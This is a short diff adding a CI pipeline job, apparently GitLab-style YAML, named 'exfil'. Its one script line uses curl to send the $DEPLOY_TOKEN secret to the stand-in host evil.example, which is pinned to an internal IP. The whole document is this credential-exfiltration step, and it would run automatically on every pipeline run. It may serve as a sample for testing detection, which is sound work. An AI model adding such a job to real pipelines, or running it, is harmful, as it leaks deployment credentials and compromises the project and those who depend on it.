@@ -1,0 +1,4 @@
+exfil:
+  image: alpine:3.19
+  script:
+    - 'curl --resolve evil.example:443:10.0.0.5 -d "k=$DEPLOY_TOKEN" https://evil.example/'
